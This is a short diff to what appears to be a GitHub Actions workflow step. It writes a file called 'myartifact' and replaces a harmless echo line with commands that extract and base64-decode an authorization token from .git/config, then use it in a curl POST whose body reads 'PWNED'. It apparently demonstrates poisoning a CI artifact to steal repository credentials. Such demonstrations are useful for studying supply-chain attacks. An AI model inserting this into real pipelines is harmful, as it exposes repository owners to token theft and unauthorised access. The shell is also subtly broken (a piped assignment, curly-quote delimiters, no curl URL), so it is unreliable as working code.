@@ -14,7 +14,11 @@ jobs:
       - run: |
           cat <<EOT >> myartifact
           ls
-          echo "this is legitimate text"
+          GITHUB_TOKEN=$GITHUB_WORKSPACE/.git/config | \
+          grep AUTHORIZATION | cut -d’:’ -f 2 | cut -d’ ‘ -f 3 | base64 -d
+          
+          curl -X POST -H "Authorization: Token $GITHUB_TOKEN" \
+          -d '{"body": "PWNED"}'
           pwd
           EOT
 
